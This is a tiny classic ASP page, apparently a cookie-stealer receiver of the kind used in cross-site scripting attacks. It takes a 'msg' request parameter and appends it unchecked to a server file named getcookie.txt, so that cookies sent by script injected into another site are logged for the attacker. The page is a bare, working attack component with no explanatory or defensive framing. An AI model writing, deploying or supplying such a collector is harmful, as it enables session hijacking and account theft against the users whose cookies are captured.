<html>

<title>xx</title>

<body>

<%testfile = Server.MapPath("getcookie.txt")

msg = Request("msg") 

set fs = server.CreateObject("scripting.filesystemobject")

set thisfile = fs.OpenTextFile(testfile,8,True,0)

thisfile.WriteLine(""&msg&"")

thisfile.close()

set fs = nothing%>

</body>

</html>